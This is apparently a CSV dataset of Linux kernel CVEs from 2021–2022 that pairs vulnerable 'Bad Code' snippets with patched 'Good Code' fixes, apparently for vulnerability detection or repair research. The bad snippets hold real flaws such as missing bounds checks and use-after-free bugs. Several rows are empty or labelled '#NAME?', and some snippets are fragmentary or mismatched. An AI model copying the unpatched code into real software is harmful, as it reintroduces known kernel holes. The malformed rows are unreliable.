Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2022,,CVE-2022-27950,"
 return 0;
err_free:

 kfree(priv);
 return ret;
}
","
 return 0;
err_free:
 usb_put_dev(udev);
 kfree(priv);
 return ret;
}
"
2022,Overflow ,CVE-2022-27666,"
#include <linux/skbuff.h>



struct ip_esp_hdr;

static inline struct ip_esp_hdr *ip_esp_hdr(const struct sk_buff *skb)
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;


 /* this is non-NULL only with TCP/UDP Encapsulation */
 if (x->encap) {
 return err;
	}





 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;


 if (x->encap) {
 int err = esp6_output_encap(x, skb, esp);
 return err;
	}





 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
","
#include <linux/skbuff.h>

#define ESP_SKB_FRAG_MAXSIZE (PAGE_SIZE << SKB_FRAG_PAGE_ORDER)

struct ip_esp_hdr;

static inline struct ip_esp_hdr *ip_esp_hdr(const struct sk_buff *skb)
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;
 unsigned int allocsz;

 /* this is non-NULL only with TCP/UDP Encapsulation */
 if (x->encap) {
 return err;
	}

	allocsz = ALIGN(skb->data_len + tailen, L1_CACHE_BYTES);
 if (allocsz > ESP_SKB_FRAG_MAXSIZE)
 goto cow;

 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;
 unsigned int allocsz;

 if (x->encap) {
 int err = esp6_output_encap(x, skb, esp);
 return err;
	}

	allocsz = ALIGN(skb->data_len + tailen, L1_CACHE_BYTES);
 if (allocsz > ESP_SKB_FRAG_MAXSIZE)
 goto cow;

 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
"
2022,,CVE-2022-27223," break;
 case USB_RECIP_ENDPOINT:
		epnum = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;


		target_ep = &udc->ep[epnum];
		epcfgreg = udc->read_fn(udc->addr + target_ep->offset);
		halt = epcfgreg & XUSB_EP_CFG_STALL_MASK;
 case USB_RECIP_ENDPOINT:
 if (!udc->setup.wValue) {
			endpoint = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;




			target_ep = &udc->ep[endpoint];
			outinbit = udc->setup.wIndex & USB_ENDPOINT_DIR_MASK;
			outinbit = outinbit >> 7;
"," break;
 case USB_RECIP_ENDPOINT:
		epnum = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;
 if (epnum >= XUSB_MAX_ENDPOINTS)
 goto stall;
		target_ep = &udc->ep[epnum];
		epcfgreg = udc->read_fn(udc->addr + target_ep->offset);
		halt = epcfgreg & XUSB_EP_CFG_STALL_MASK;
 case USB_RECIP_ENDPOINT:
 if (!udc->setup.wValue) {
			endpoint = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;
 if (endpoint >= XUSB_MAX_ENDPOINTS) {
 xudc_ep0_stall(udc);
 return;
			}
			target_ep = &udc->ep[endpoint];
			outinbit = udc->setup.wIndex & USB_ENDPOINT_DIR_MASK;
			outinbit = outinbit >> 7;
"
2022,#NAME?,CVE-2022-26966,,
2022,,CVE-2022-26878,,
2022,Overflow ,CVE-2022-26490," return -ENOMEM;

		transaction->aid_len = skb->data[1];





 memcpy(transaction->aid, &skb->data[2],
		       transaction->aid_len);

 return -EPROTO;

		transaction->params_len = skb->data[transaction->aid_len + 3];





 memcpy(transaction->params, skb->data +
		       transaction->aid_len + 4, transaction->params_len);

"," return -ENOMEM;

		transaction->aid_len = skb->data[1];

 /* Checking if the length of the AID is valid */
 if (transaction->aid_len > sizeof(transaction->aid))
 return -EINVAL;

 memcpy(transaction->aid, &skb->data[2],
		       transaction->aid_len);

 return -EPROTO;

		transaction->params_len = skb->data[transaction->aid_len + 3];

 /* Total size is allocated (skb->len - 2) minus fixed array members */
 if (transaction->params_len > ((skb->len - 2) - sizeof(struct nfc_evt_transaction)))
 return -EINVAL;

 memcpy(transaction->params, skb->data +
		       transaction->aid_len + 4, transaction->params_len);

"
2022,#NAME?,CVE-2022-25636,,
2022,#NAME?,CVE-2022-25375,"	rndis_set_cmplt_type *resp;
 rndis_resp_t *r;







	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
 if (!r)
 return -ENOMEM;
	resp = (rndis_set_cmplt_type *)r->buf;

	BufLength = le32_to_cpu(buf->InformationBufferLength);
	BufOffset = le32_to_cpu(buf->InformationBufferOffset);

#ifdef	VERBOSE_DEBUG
 pr_debug(""%s: Length: %d\n"", __func__, BufLength);
 pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
","	rndis_set_cmplt_type *resp;
 rndis_resp_t *r;

	BufLength = le32_to_cpu(buf->InformationBufferLength);
	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
 if ((BufLength > RNDIS_MAX_TOTAL_SIZE) ||
	    (BufOffset + 8 >= RNDIS_MAX_TOTAL_SIZE))
 return -EINVAL;

	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
 if (!r)
 return -ENOMEM;
	resp = (rndis_set_cmplt_type *)r->buf;




#ifdef	VERBOSE_DEBUG
 pr_debug(""%s: Length: %d\n"", __func__, BufLength);
 pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
"
2022,,CVE-2022-25265,,
2022,Mem. Corr. ,CVE-2022-25258," if (w_index != 0x5 || (w_value >> 8))
 break;
				interface = w_value & 0xFF;



				buf[6] = w_index;
				count = count_ext_prop(os_desc_cfg,
					interface);
"," if (w_index != 0x5 || (w_value >> 8))
 break;
				interface = w_value & 0xFF;
 if (interface >= MAX_CONFIG_INTERFACES ||
				    !os_desc_cfg->interface[interface])
 break;
				buf[6] = w_index;
				count = count_ext_prop(os_desc_cfg,
					interface);
"
2022,,CVE-2022-24959,"		ym = memdup_user(data, sizeof(struct yamdrv_ioctl_mcs));
 if (IS_ERR(ym))
 return PTR_ERR(ym);
 if (ym->cmd != SIOCYAMSMCS)
 return -EINVAL;
 if (ym->bitrate > YAM_MAXBITRATE) {
 kfree(ym);
 return -EINVAL;
		}
","		ym = memdup_user(data, sizeof(struct yamdrv_ioctl_mcs));
 if (IS_ERR(ym))
 return PTR_ERR(ym);
 if (ym->cmd != SIOCYAMSMCS || ym->bitrate > YAM_MAXBITRATE) {


 kfree(ym);
 return -EINVAL;
		}
"
2022,,CVE-2022-24958," spin_lock_irq (&dev->lock);
	value = -EINVAL;
 if (dev->buf) {

 kfree(kbuf);
 goto fail;
	}
	dev->buf = kbuf;

"," spin_lock_irq (&dev->lock);
	value = -EINVAL;
 if (dev->buf) {
 spin_unlock_irq(&dev->lock);
 kfree(kbuf);
 return value;
	}
	dev->buf = kbuf;

"
2022,,CVE-2022-24448,"
no_open:
	res = nfs_lookup(dir, dentry, lookup_flags);













 if (switched) {
 d_lookup_done(dentry);
 if (!res)
","
no_open:
	res = nfs_lookup(dir, dentry, lookup_flags);
 if (!res) {
		inode = d_inode(dentry);
 if ((lookup_flags & LOOKUP_DIRECTORY) && inode &&
		    !S_ISDIR(inode->i_mode))
			res = ERR_PTR(-ENOTDIR);
	} else if (!IS_ERR(res)) {
		inode = d_inode(res);
 if ((lookup_flags & LOOKUP_DIRECTORY) && inode &&
		    !S_ISDIR(inode->i_mode)) {
 dput(res);
			res = ERR_PTR(-ENOTDIR);
		}
	}
 if (switched) {
 d_lookup_done(dentry);
 if (!res)
"
2022,,CVE-2022-24122," kfree(new);
		} else {
 hlist_add_head(&new->node, hashent);

 spin_unlock_irq(&ucounts_lock);
 return new;
		}
 if (atomic_dec_and_lock_irqsave(&ucounts->count, &ucounts_lock, flags)) {
 hlist_del_init(&ucounts->node);
 spin_unlock_irqrestore(&ucounts_lock, flags);

 kfree(ucounts);
	}
}
"," kfree(new);
		} else {
 hlist_add_head(&new->node, hashent);
 get_user_ns(new->ns);
 
 spin_unlock_irqrestore(&ucounts_lock, flags);
 put_user_ns(ucounts->ns);
 kfree(ucounts);
	}
}
"
2022,#NAME?,CVE-2022-23222,,
2022,#NAME?,CVE-2022-1055,"spin_unlock_irq(&ucounts_lock);
 return new;
  }
 if (atomic_dec_and_lock_irqsave(&ucounts>count, &ucounts_lock)) {
 hlist_del_init(&ucounts>node);","spin_unlock_irq(&ucounts_lock);
 return new;
  }
 if (atomic_dec_and_lock_irqsave(&ucounts->count, &ucounts_lock, flags)) {
 hlist_del_init(&ucounts->node);"
2022,,CVE-2022-1011,,
2022,Overflow ,CVE-2022-0998,,
2022,DoS +Priv ,CVE-2022-0995,,
2022,,CVE-2022-0854,,
2022,,CVE-2022-0847,,
2022,,CVE-2022-0742,,
2022,,CVE-2022-0646,,
2022,,CVE-2022-0617,,
2022,,CVE-2022-0516,,
2022,Overflow ,CVE-2022-0500,,
2022,#NAME?,CVE-2022-0494,,
2022,Bypass ,CVE-2022-0492,,
2022,,CVE-2022-0487,,
2022,Overflow ,CVE-2022-0435,,
2022,,CVE-2022-0433,,
2022,#NAME?,CVE-2022-0382," msg_set_syn(hdr, 1);
	}



 /* Determine destination */
 if (atype == TIPC_SERVICE_RANGE) {
 return tipc_sendmcast(sock, ua, m, dlen, timeout);
"," msg_set_syn(hdr, 1);
	}

 memset(&skaddr, 0, sizeof(skaddr));

 /* Determine destination */
 if (atype == TIPC_SERVICE_RANGE) {
 return tipc_sendmcast(sock, ua, m, dlen, timeout);
"
2022,,CVE-2022-0330,,
2022,DoS ,CVE-2022-0286,,
2022,,CVE-2022-0264,,
2022,Overflow ,CVE-2022-0185,,
2022,DoS ,CVE-2021-46283,,
2021,#NAME?,CVE-2021-45486,,
2021,#NAME?,CVE-2021-45485,,
2021,,CVE-2021-45480,"				 * should end up here, but if it
				 * does, reset/destroy the connection.
 */

 kmem_cache_free(rds_conn_slab, conn);
				conn = ERR_PTR(-EOPNOTSUPP);
 goto out;
","				 * should end up here, but if it
				 * does, reset/destroy the connection.
 */
 kfree(conn->c_path);
 kmem_cache_free(rds_conn_slab, conn);
				conn = ERR_PTR(-EOPNOTSUPP);
 goto out;
"
2021,,CVE-2021-45469,,
2022,#NAME?,CVE-2021-45402,,
2021,#NAME?,CVE-2021-45095,"
	err = pep_accept_conn(newsk, skb);
 if (err) {

 sock_put(newsk);
		newsk = NULL;
 goto drop;
","
	err = pep_accept_conn(newsk, skb);
 if (err) {
 __sock_put(sk);
 sock_put(newsk);
		newsk = NULL;
 goto drop;
"
2022,,CVE-2021-44879,,
2021,,CVE-2021-44733,,
2021,DoS ,CVE-2021-43976,,
2021,,CVE-2021-43975,,
2021,,CVE-2021-43389,,
2021,,CVE-2021-43267,"	u16 key_gen = msg_key_gen(hdr);
	u16 size = msg_data_sz(hdr);
	u8 *data = msg_data(hdr);

















 spin_lock(&rx->lock);
 if (unlikely(rx->skey || (key_gen == rx->key_gen && rx->key.keys))) {
 pr_err(""%s: key existed <%p>, gen %d vs %d\n"", rx->name,
		       rx->skey, key_gen, rx->key_gen);
 goto exit;
	}

 /* Allocate memory for the key */
	skey = kmalloc(size, GFP_ATOMIC);
 if (unlikely(!skey)) {
 pr_err(""%s: unable to allocate memory for skey\n"", rx->name);
 goto exit;
	}

 /* Copy key from msg data */
	skey->keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME)));
 memcpy(skey->alg_name, data, TIPC_AEAD_ALG_NAME);
 memcpy(skey->key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32),
	       skey->keylen);

 /* Sanity check */
 if (unlikely(size != tipc_aead_key_size(skey))) {
 kfree(skey);
		skey = NULL;
 goto exit;
	}

	rx->key_gen = key_gen;
	rx->skey_mode = msg_key_mode(hdr);
	rx->skey = skey;
	rx->nokey = 0;
 mb(); /* for nokey flag */

exit:
 spin_unlock(&rx->lock);


 /* Schedule the key attaching on this crypto */
 if (likely(skey && queue_delayed_work(tx->wq, &rx->work, 0)))
 return true;
","	u16 key_gen = msg_key_gen(hdr);
	u16 size = msg_data_sz(hdr);
	u8 *data = msg_data(hdr);
 unsigned int keylen;

 /* Verify whether the size can exist in the packet */
 if (unlikely(size < sizeof(struct tipc_aead_key) + TIPC_AEAD_KEYLEN_MIN)) {
 pr_debug(""%s: message data size is too small\n"", rx->name);
 goto exit;
	}

	keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME)));

 /* Verify the supplied size values */
 if (unlikely(size != keylen + sizeof(struct tipc_aead_key) ||
		     keylen > TIPC_AEAD_KEY_SIZE_MAX)) {
 pr_debug(""%s: invalid MSG_CRYPTO key size\n"", rx->name);
 goto exit;
	}

 spin_lock(&rx->lock);
 if (unlikely(rx->skey || (key_gen == rx->key_gen && rx->key.keys))) {
 pr_err(""%s: key existed <%p>, gen %d vs %d\n"", rx->name,
		       rx->skey, key_gen, rx->key_gen);
 goto exit_unlock;
	}

 /* Allocate memory for the key */
	skey = kmalloc(size, GFP_ATOMIC);
 if (unlikely(!skey)) {
 pr_err(""%s: unable to allocate memory for skey\n"", rx->name);
 goto exit_unlock;
	}

 /* Copy key from msg data */
	skey->keylen = keylen;
 memcpy(skey->alg_name, data, TIPC_AEAD_ALG_NAME);
 memcpy(skey->key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32),
	       skey->keylen);








	rx->key_gen = key_gen;
	rx->skey_mode = msg_key_mode(hdr);
	rx->skey = skey;
	rx->nokey = 0;
 mb(); /* for nokey flag */

exit_unlock:
 spin_unlock(&rx->lock);

exit:
 /* Schedule the key attaching on this crypto */
 if (likely(skey && queue_delayed_work(tx->wq, &rx->work, 0)))
 return true;
"
2021,Mem. Corr. ,CVE-2021-43057,,
2021,,CVE-2021-43056,,
2021,Overflow ,CVE-2021-42739,,
2021,Overflow ,CVE-2021-42327,,
2021,,CVE-2021-42252,,
2021,,CVE-2021-42008,,
2021,Overflow ,CVE-2021-41864,"
static int prealloc_elems_and_freelist(struct bpf_stack_map *smap)
{
	u32 elem_size = sizeof(struct stack_map_bucket) + smap->map.value_size;

 int err;

	smap->elems = bpf_map_area_alloc(elem_size * smap->map.max_entries,
","
static int prealloc_elems_and_freelist(struct bpf_stack_map *smap)
{
	u64 elem_size = sizeof(struct stack_map_bucket) +
			(u64)smap->map.value_size;
 int err;

	smap->elems = bpf_map_area_alloc(elem_size * smap->map.max_entries,
"
2021,#NAME?,CVE-2021-41073,,
2021,,CVE-2021-40490,,
2021,Exec Code ,CVE-2021-38300,,
2021,,CVE-2021-38209," nf_conntrack_standalone_init_dccp_sysctl(net, table);
 nf_conntrack_standalone_init_gre_sysctl(net, table);

 /* Don't allow unprivileged users to alter certain sysctls */
 if (net->user_ns != &init_user_ns) {
		table[NF_SYSCTL_CT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_EXPECT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_HELPER].mode = 0444;
#ifdef CONFIG_NF_CONNTRACK_EVENTS
		table[NF_SYSCTL_CT_EVENTS].mode = 0444;
#endif
		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	} else if (!net_eq(&init_net, net)) {
		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	}

"," nf_conntrack_standalone_init_dccp_sysctl(net, table);
 nf_conntrack_standalone_init_gre_sysctl(net, table);

 /* Don't allow non-init_net ns to alter global sysctls */
 if (!net_eq(&init_net, net)) {
		table[NF_SYSCTL_CT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_EXPECT_MAX].mode = 0444;






		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	}

"
2021,DoS ,CVE-2021-38208," if (!llcp_sock->service_name) {
 nfc_llcp_local_put(llcp_sock->local);
		llcp_sock->local = NULL;

		ret = -ENOMEM;
 goto put_dev;
	}
		llcp_sock->local = NULL;
 kfree(llcp_sock->service_name);
		llcp_sock->service_name = NULL;

		ret = -EADDRINUSE;
 goto put_dev;
	}
"," if (!llcp_sock->service_name) {
 nfc_llcp_local_put(llcp_sock->local);
		llcp_sock->local = NULL;
		llcp_sock->dev = NULL;
		ret = -ENOMEM;
 goto put_dev;
	}
		llcp_sock->local = NULL;
 kfree(llcp_sock->service_name);
		llcp_sock->service_name = NULL;
		llcp_sock->dev = NULL;
		ret = -EADDRINUSE;
 goto put_dev;
	}
"
2021,DoS Overflow ,CVE-2021-38207," smp_mb();

 /* Space might have just been freed - check again */
 if (temac_check_tx_bd_space(lp, num_frag))
 return NETDEV_TX_BUSY;

 netif_wake_queue(ndev);
"," smp_mb();

 /* Space might have just been freed - check again */
 if (temac_check_tx_bd_space(lp, num_frag + 1))
 return NETDEV_TX_BUSY;

 netif_wake_queue(ndev);
"
2021,DoS ,CVE-2021-38206,"
/**
 * ieee80211_parse_tx_radiotap - Sanity-check and parse the radiotap header
 *				 of injected frames





 * @skb: packet injected by userspace
 * @dev: the &struct device of this 802.11 device
 */
 ieee80211_tx(sdata, sta, skb, false);
}





















bool ieee80211_parse_tx_radiotap(struct sk_buff *skb,
 struct net_device *dev)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *) skb->data;
 struct ieee80211_tx_info *info = IEEE80211_SKB_CB(skb);
 struct ieee80211_supported_band *sband =
		local->hw.wiphy->bands[info->band];
 int ret = ieee80211_radiotap_iterator_init(&iterator, rthdr, skb->len,
 NULL);
	u16 txflags;
	u8 vht_mcs = 0, vht_nss = 0;
 int i;

 /* check for not even having the fixed radiotap header part */
 if (unlikely(skb->len < sizeof(struct ieee80211_radiotap_header)))
 return false; /* too short to be possibly valid */

 /* is it a header version we can trust to find length from? */
 if (unlikely(rthdr->it_version))
 return false; /* only version 0 is supported */

 /* does the skb contain enough to deliver on the alleged length? */
 if (unlikely(skb->len < ieee80211_get_radiotap_len(skb->data)))
 return false; /* skb too short for claimed rt header extent */

	info->flags |= IEEE80211_TX_INTFL_DONT_ENCRYPT |
		       IEEE80211_TX_CTL_DONTFRAG;
 return false;

 if (rate_found) {



		info->control.flags |= IEEE80211_TX_CTRL_RATE_INJECT;

 for (i = 0; i < IEEE80211_TX_MAX_RATES; i++) {
		} else if (rate_flags & IEEE80211_TX_RC_VHT_MCS) {
 ieee80211_rate_set_vht(info->control.rates, vht_mcs,
					       vht_nss);
		} else {
 for (i = 0; i < sband->n_bitrates; i++) {
 if (rate * 5 != sband->bitrates[i].bitrate)
 continue;
	info->flags = IEEE80211_TX_CTL_REQ_TX_STATUS |
		      IEEE80211_TX_CTL_INJECTED;

 /* Sanity-check and process the injection radiotap header */
 if (!ieee80211_parse_tx_radiotap(skb, dev))
 goto fail;

 /* we now know there is a radiotap header with a length we can use */
 ieee80211_select_queue_80211(sdata, skb, hdr);
 skb_set_queue_mapping(skb, ieee80211_ac_from_tid(skb->priority));









 /* remove the injection radiotap header */
 skb_pull(skb, len_rthdr);

","
/**
 * ieee80211_parse_tx_radiotap - Sanity-check and parse the radiotap header
 *				 of injected frames.
 *
 * To accurately parse and take into account rate and retransmission fields,
 * you must initialize the chandef field in the ieee80211_tx_info structure
 * of the skb before calling this function.
 *
 * @skb: packet injected by userspace
 * @dev: the &struct device of this 802.11 device
 */
 ieee80211_tx(sdata, sta, skb, false);
}

static bool ieee80211_validate_radiotap_len(struct sk_buff *skb)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *)skb->data;

 /* check for not even having the fixed radiotap header part */
 if (unlikely(skb->len < sizeof(struct ieee80211_radiotap_header)))
 return false; /* too short to be possibly valid */

 /* is it a header version we can trust to find length from? */
 if (unlikely(rthdr->it_version))
 return false; /* only version 0 is supported */

 /* does the skb contain enough to deliver on the alleged length? */
 if (unlikely(skb->len < ieee80211_get_radiotap_len(skb->data)))
 return false; /* skb too short for claimed rt header extent */

 return true;
}

bool ieee80211_parse_tx_radiotap(struct sk_buff *skb,
 struct net_device *dev)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *) skb->data;
 struct ieee80211_tx_info *info = IEEE80211_SKB_CB(skb);


 int ret = ieee80211_radiotap_iterator_init(&iterator, rthdr, skb->len,
 NULL);
	u16 txflags;
	u8 vht_mcs = 0, vht_nss = 0;
 int i;

 if (!ieee80211_validate_radiotap_len(skb))
 return false;










	info->flags |= IEEE80211_TX_INTFL_DONT_ENCRYPT |
		       IEEE80211_TX_CTL_DONTFRAG;
 return false;

 if (rate_found) {
 struct ieee80211_supported_band *sband =
			local->hw.wiphy->bands[info->band];

		info->control.flags |= IEEE80211_TX_CTRL_RATE_INJECT;

 for (i = 0; i < IEEE80211_TX_MAX_RATES; i++) {
		} else if (rate_flags & IEEE80211_TX_RC_VHT_MCS) {
 ieee80211_rate_set_vht(info->control.rates, vht_mcs,
					       vht_nss);
		} else if (sband) {
 for (i = 0; i < sband->n_bitrates; i++) {
 if (rate * 5 != sband->bitrates[i].bitrate)
 continue;
	info->flags = IEEE80211_TX_CTL_REQ_TX_STATUS |
		      IEEE80211_TX_CTL_INJECTED;

 /* Sanity-check the length of the radiotap header */
 if (!ieee80211_validate_radiotap_len(skb))
 goto fail;

 /* we now know there is a radiotap header with a length we can use */
 ieee80211_select_queue_80211(sdata, skb, hdr);
 skb_set_queue_mapping(skb, ieee80211_ac_from_tid(skb->priority));

 /*
	 * Process the radiotap header. This will now take into account the
	 * selected chandef above to accurately set injection rates and
	 * retransmissions.
 */
 if (!ieee80211_parse_tx_radiotap(skb, dev))
 goto fail_rcu;

 /* remove the injection radiotap header */
 skb_pull(skb, len_rthdr);

"
2021,,CVE-2021-38205,"	}

 dev_info(dev,
 ""Xilinx EmacLite at 0x%08lX mapped to 0x%08lX, irq=%d\n"",
		 (unsigned long __force)ndev->mem_start,
		 (unsigned long __force)lp->base_addr, ndev->irq);
 return 0;

error:
","	}

 dev_info(dev,
 ""Xilinx EmacLite at 0x%08lX mapped to 0x%p, irq=%d\n"",
		 (unsigned long __force)ndev->mem_start, lp->base_addr, ndev->irq);

 return 0;

error:
"
2021,DoS ,CVE-2021-38204," */
 struct urb *curr_urb;
 enum scheduling_pass sched_pass;
 struct usb_device *loaded_dev;	/* dev that's loaded into the chip */
 int loaded_epnum;		/* epnum whose toggles are loaded */
 int urb_done;			/* > 0 -> no errors, < 0: errno */
 size_t curr_len;
	u8 hien;
 * Caller must NOT hold HCD spinlock.
 */
static void
max3421_set_address(struct usb_hcd *hcd, struct usb_device *dev, int epnum,
 int force_toggles)
{
 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 int old_epnum, same_ep, rcvtog, sndtog;
 struct usb_device *old_dev;
	u8 hctl;

	old_dev = max3421_hcd->loaded_dev;
	old_epnum = max3421_hcd->loaded_epnum;

	same_ep = (dev == old_dev && epnum == old_epnum);
 if (same_ep && !force_toggles)
 return;

 if (old_dev && !same_ep) {
 /* save the old end-points toggles: */
		u8 hrsl = spi_rd8(hcd, MAX3421_REG_HRSL);

		rcvtog = (hrsl >> MAX3421_HRSL_RCVTOGRD_BIT) & 1;
		sndtog = (hrsl >> MAX3421_HRSL_SNDTOGRD_BIT) & 1;

 /* no locking: HCD (i.e., we) own toggles, don't we? */
 usb_settoggle(old_dev, old_epnum, 0, rcvtog);
 usb_settoggle(old_dev, old_epnum, 1, sndtog);
	}
 /* setup new endpoint's toggle bits: */
	rcvtog = usb_gettoggle(dev, epnum, 0);
	sndtog = usb_gettoggle(dev, epnum, 1);
	hctl = (BIT(rcvtog + MAX3421_HCTL_RCVTOG0_BIT) |
 BIT(sndtog + MAX3421_HCTL_SNDTOG0_BIT));

	max3421_hcd->loaded_epnum = epnum;
 spi_wr8(hcd, MAX3421_REG_HCTL, hctl);

 /*
	 * Note: devnum for one and the same device can change during
	 * address-assignment so it's best to just always load the
	 * address whenever the end-point changed/was forced.
 */
	max3421_hcd->loaded_dev = dev;
 spi_wr8(hcd, MAX3421_REG_PERADDR, dev->devnum);
}

 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 struct urb *urb, *curr_urb = NULL;
 struct max3421_ep *max3421_ep;
 int epnum, force_toggles = 0;
 struct usb_host_endpoint *ep;
 struct list_head *pos;
 unsigned long flags;
 usb_settoggle(urb->dev, epnum, 0, 1);
 usb_settoggle(urb->dev, epnum, 1, 1);
			max3421_ep->pkt_state = PKT_STATE_SETUP;
			force_toggles = 1;
		} else
			max3421_ep->pkt_state = PKT_STATE_TRANSFER;
	}

 spin_unlock_irqrestore(&max3421_hcd->lock, flags);

	max3421_ep->last_active = max3421_hcd->frame_number;
 max3421_set_address(hcd, urb->dev, epnum, force_toggles);
 max3421_set_speed(hcd, urb->dev);
 max3421_next_transfer(hcd, 0);
 return 1;
		status = 0;
	urb = max3421_hcd->curr_urb;
 if (urb) {










		max3421_hcd->curr_urb = NULL;
 spin_lock_irqsave(&max3421_hcd->lock, flags);
 usb_hcd_unlink_urb_from_ep(hcd, urb);
"," */
 struct urb *curr_urb;
 enum scheduling_pass sched_pass;


 int urb_done;			/* > 0 -> no errors, < 0: errno */
 size_t curr_len;
	u8 hien;
 * Caller must NOT hold HCD spinlock.
 */
static void
max3421_set_address(struct usb_hcd *hcd, struct usb_device *dev, int epnum)

{
 int rcvtog, sndtog;


	u8 hctl;



















 /* setup new endpoint's toggle bits: */
	rcvtog = usb_gettoggle(dev, epnum, 0);
	sndtog = usb_gettoggle(dev, epnum, 1);
	hctl = (BIT(rcvtog + MAX3421_HCTL_RCVTOG0_BIT) |
 BIT(sndtog + MAX3421_HCTL_SNDTOG0_BIT));


 spi_wr8(hcd, MAX3421_REG_HCTL, hctl);

 /*
	 * Note: devnum for one and the same device can change during
	 * address-assignment so it's best to just always load the
	 * address whenever the end-point changed/was forced.
 */

 spi_wr8(hcd, MAX3421_REG_PERADDR, dev->devnum);
}

 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 struct urb *urb, *curr_urb = NULL;
 struct max3421_ep *max3421_ep;
 int epnum;
 struct usb_host_endpoint *ep;
 struct list_head *pos;
 unsigned long flags;
 usb_settoggle(urb->dev, epnum, 0, 1);
 usb_settoggle(urb->dev, epnum, 1, 1);
			max3421_ep->pkt_state = PKT_STATE_SETUP;

		} else
			max3421_ep->pkt_state = PKT_STATE_TRANSFER;
	}

 spin_unlock_irqrestore(&max3421_hcd->lock, flags);

	max3421_ep->last_active = max3421_hcd->frame_number;
 max3421_set_address(hcd, urb->dev, epnum);
 max3421_set_speed(hcd, urb->dev);
 max3421_next_transfer(hcd, 0);
 return 1;
		status = 0;
	urb = max3421_hcd->curr_urb;
 if (urb) {
 /* save the old end-points toggles: */
		u8 hrsl = spi_rd8(hcd, MAX3421_REG_HRSL);
 int rcvtog = (hrsl >> MAX3421_HRSL_RCVTOGRD_BIT) & 1;
 int sndtog = (hrsl >> MAX3421_HRSL_SNDTOGRD_BIT) & 1;
 int epnum = usb_endpoint_num(&urb->ep->desc);

 /* no locking: HCD (i.e., we) own toggles, don't we? */
 usb_settoggle(urb->dev, epnum, 0, rcvtog);
 usb_settoggle(urb->dev, epnum, 1, sndtog);

		max3421_hcd->curr_urb = NULL;
 spin_lock_irqsave(&max3421_hcd->lock, flags);
 usb_hcd_unlink_urb_from_ep(hcd, urb);
"
2021,DoS ,CVE-2021-38203," */
void check_system_chunk(struct btrfs_trans_handle *trans, u64 type)
{
 struct btrfs_transaction *cur_trans = trans->transaction;
 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_space_info *info;
	u64 left;
 lockdep_assert_held(&fs_info->chunk_mutex);

	info = btrfs_find_space_info(fs_info, BTRFS_BLOCK_GROUP_SYSTEM);
again:
 spin_lock(&info->lock);
	left = info->total_bytes - btrfs_space_info_used(info, true);
 spin_unlock(&info->lock);

 if (left < thresh) {
		u64 flags = btrfs_system_alloc_profile(fs_info);
		u64 reserved = atomic64_read(&cur_trans->chunk_bytes_reserved);

 /*
		 * If there's not available space for the chunk tree (system
		 * space) and there are other tasks that reserved space for
		 * creating a new system block group, wait for them to complete
		 * the creation of their system block group and release excess
		 * reserved space. We do this because:
		 *
		 * *) We can end up allocating more system chunks than necessary
		 *    when there are multiple tasks that are concurrently
		 *    allocating block groups, which can lead to exhaustion of
		 *    the system array in the superblock;
		 *
		 * *) If we allocate extra and unnecessary system block groups,
		 *    despite being empty for a long time, and possibly forever,
		 *    they end not being added to the list of unused block groups
		 *    because that typically happens only when deallocating the
		 *    last extent from a block group - which never happens since
		 *    we never allocate from them in the first place. The few
		 *    exceptions are when mounting a filesystem or running scrub,
		 *    which add unused block groups to the list of unused block
		 *    groups, to be deleted by the cleaner kthread.
		 *    And even when they are added to the list of unused block
		 *    groups, it can take a long time until they get deleted,
		 *    since the cleaner kthread might be sleeping or busy with
		 *    other work (deleting subvolumes, running delayed iputs,
		 *    defrag scheduling, etc);
		 *
		 * This is rare in practice, but can happen when too many tasks
		 * are allocating blocks groups in parallel (via fallocate())
		 * and before the one that reserved space for a new system block
		 * group finishes the block group creation and releases the space
		 * reserved in excess (at btrfs_create_pending_block_groups()),
		 * other tasks end up here and see free system space temporarily
		 * not enough for updating the chunk tree.
		 *
		 * We unlock the chunk mutex before waiting for such tasks and
		 * lock it again after the wait, otherwise we would deadlock.
		 * It is safe to do so because allocating a system chunk is the
		 * first thing done while allocating a new block group.
 */
 if (reserved > trans->chunk_bytes_reserved) {
 const u64 min_needed = reserved - thresh;

 mutex_unlock(&fs_info->chunk_mutex);
 wait_event(cur_trans->chunk_reserve_wait,
 atomic64_read(&cur_trans->chunk_bytes_reserved) <=
			   min_needed);
 mutex_lock(&fs_info->chunk_mutex);
 goto again;
		}

 /*
		 * Ignore failure to create system chunk. We might end up not
